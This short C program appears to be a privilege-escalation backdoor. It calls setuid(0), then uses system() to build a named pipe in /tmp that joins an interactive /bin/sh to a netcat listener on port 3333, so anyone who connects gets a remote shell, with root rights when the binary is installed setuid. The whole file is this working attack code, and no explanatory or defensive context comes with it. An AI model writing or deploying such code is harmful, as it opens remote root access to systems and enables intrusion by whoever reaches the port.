#include <stdlib.h>
#include <unistd.h>
int main(int argc, char**argv) {
	setuid(0);
	system("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 3333 > /tmp/f");
	return 0;
}
